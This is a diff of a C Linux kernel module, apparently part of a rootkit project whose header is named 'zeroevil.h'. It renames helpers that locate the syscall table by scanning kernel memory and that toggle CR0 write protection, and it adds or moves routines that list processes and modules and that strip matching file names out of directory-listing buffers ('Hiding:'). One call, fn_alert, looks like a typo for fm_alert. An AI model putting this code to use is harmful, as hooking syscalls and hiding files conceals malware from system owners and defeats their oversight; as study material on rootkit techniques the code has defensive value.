@@ -27,12 +27,13 @@
 # include <linux/syscalls.h>
 # endif // CPP
 
-# include "structs.h"
+# include "zeroevil.h"
 
 
-// WARN: This can be cheated.
-static unsigned long **
-get_sys_call_table_via_sys_close(void)
+// WARN: This can be cheated if someone places a faked
+// but unmodified sys_call_table before the real one.
+unsigned long **
+get_sct_via_sys_close(void)
 {
     unsigned long **entry = (unsigned long **)PAGE_OFFSET;
 
@@ -47,15 +48,15 @@ get_sys_call_table_via_sys_close(void)
 
 
 unsigned long **
-get_sys_call_table(void)
+get_sct(void)
 {
-    return get_sys_call_table_via_sys_close();
+    return get_sct_via_sys_close();
 }
 
 
 // TODO: Consider race condition on SMP systems.
 void
-disable_write_protection(void)
+disable_wp(void)
 {
     unsigned long cr0;
 
@@ -71,7 +72,7 @@ disable_write_protection(void)
 
 // TODO: Consider race condition on SMP systems.
 void
-enable_write_protection(void)
+enable_wp(void)
 {
     unsigned long cr0;
 
@@ -82,6 +83,114 @@ enable_write_protection(void)
     preempt_enable();
 
     return;
+}
+
+
+void
+print_process_list(void)
+{
+    char *buff;
+    struct task_struct *task;
+
+    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
+    if (!buff) {
+        return;
+    }
+
+    strlcpy(buff, init_task.comm, PAGE_SIZE);
+    for_each_process (task) {
+        strlcat(buff, " ", PAGE_SIZE);
+        strlcat(buff, task->comm, PAGE_SIZE);
+    }
+    fm_alert("%s\n", buff);
+
+    kfree(buff);
+    return;
+}
+
+// INFO: Refer to ``next_task`` & ``for_each_process``.
+# define next_module(m)                             \
+    list_entry((m)->list.next, struct module, list)
+
+// WARN: Excluding THIS_MODULE.
+# define for_each_module(m)                                         \
+    for (m = THIS_MODULE; (m = next_module(m)) != THIS_MODULE; )
+
+void
+print_module_list(void)
+{
+    char *buff;
+    struct module *mod;
+
+    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
+    if (!buff) {
+        return;
+    }
+
+    strlcpy(buff, THIS_MODULE->name, PAGE_SIZE);
+    for_each_module(mod) {
+        strlcat(buff, " ", PAGE_SIZE);
+        strlcat(buff, mod->name, PAGE_SIZE);
+    }
+    fn_alert("%s\n", buff);
+
+    kfree(buff);
+    return;
+}
+
+
+// TODO: print_dirent64.
+void
+print_dirent(struct linux_dirent *dirp, long total)
+{
+    char *buff;
+    long index;
+    struct linux_dirent *cur;
+
+    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
+    if (!buff) {
+        return;
+    }
+
+    strlcpy(buff, dirp->d_name, PAGE_SIZE);
+    index = dirp->d_reclen;
+    cur = (struct linux_dirent *)((unsigned long)dirp + index);
+    while (index < total) {
+        strlcat(buff, " ", PAGE_SIZE);
+        strlcat(buff, cur->d_name, PAGE_SIZE);
+        index += cur->d_reclen;
+        cur = (struct linux_dirent *)((unsigned long)dirp + index);
+    }
+
+    fm_alert("%s\n", buff);
+    kfree(buff);
+
+    return;
+}
+
+
+// TODO: remove_dirent64_entry.
+long
+remove_dirent_entry(char *name,
+                    struct linux_dirent *dirp, long total)
+{
+    struct linux_dirent *cur = dirp;
+    long index = 0;
+
+    while (index < total) {
+        if (strncmp(cur->d_name, name, strlen(name)) == 0) {
+            unsigned long next = (unsigned long)cur + cur->d_reclen;
+            long rest = (unsigned long)dirp + total - next;
+            long reclen = cur->d_reclen;
+            fm_alert("Hiding: %s\n", cur->d_name);
+            memmove(cur, (void *)next, rest);
+            total -= reclen;
+        }
+        index += cur->d_reclen;
+        cur = (struct linux_dirent *)((unsigned long)dirp + index);
+    }
+
+    return total;
 }
 
 
@@ -119,7 +228,7 @@ print_memory(void *addr, size_t count, const char *prompt)
     char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
 
     if (!buff) {
-        pr_alert("%s\n", "kmalloc failed!");
+        fm_alert("%s\n", "kmalloc failed!");
         return; // TODO: Do something else?
     }
 
@@ -138,64 +247,9 @@ print_memory(void *addr, size_t count, const char *prompt)
         strlcat(buff, one, PAGE_SIZE);
     }
 
-    pr_alert("%s: %s\n", prompt, buff);
+    fm_alert("%s: %s\n", prompt, buff);
 
     kfree(buff);
 
     return;
-}
-
-
-// TODO: print_dirent64.
-void
-print_dirent(struct linux_dirent *dirp, long total)
-{
-    char *buff;
-    long index;
-    struct linux_dirent *cur;
-
-    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
-    if (!buff) {
-        return;
-    }
-
-    strlcpy(buff, dirp->d_name, PAGE_SIZE);
-    index = dirp->d_reclen;
-    cur = (struct linux_dirent *)((unsigned long)dirp + index);
-    while (index < total) {
-        strlcat(buff, " ", PAGE_SIZE);
-        strlcat(buff, cur->d_name, PAGE_SIZE);
-        index += cur->d_reclen;
-        cur = (struct linux_dirent *)((unsigned long)dirp + index);
-    }
-
-    pr_alert("%s\n", buff);
-    kfree(buff);
-
-    return;
-}
-
-
-// TODO: remove_dirent64_entry.
-long
-remove_dirent_entry(char *name,
-                    struct linux_dirent *dirp, long total)
-{
-    struct linux_dirent *cur = dirp;
-    long index = 0;
-
-    while (index < total) {
-        if (strncmp(cur->d_name, name, strlen(name)) == 0) {
-            unsigned long next = (unsigned long)cur + cur->d_reclen;
-            long rest = (unsigned long)dirp + total - next;
-            long reclen = cur->d_reclen;
-            pr_alert("Hiding: %s\n", cur->d_name);
-            memmove(cur, (void *)next, rest);
-            total -= reclen;
-        }
-        index += cur->d_reclen;
-        cur = (struct linux_dirent *)((unsigned long)dirp + index);
-    }
-
-    return total;
 }
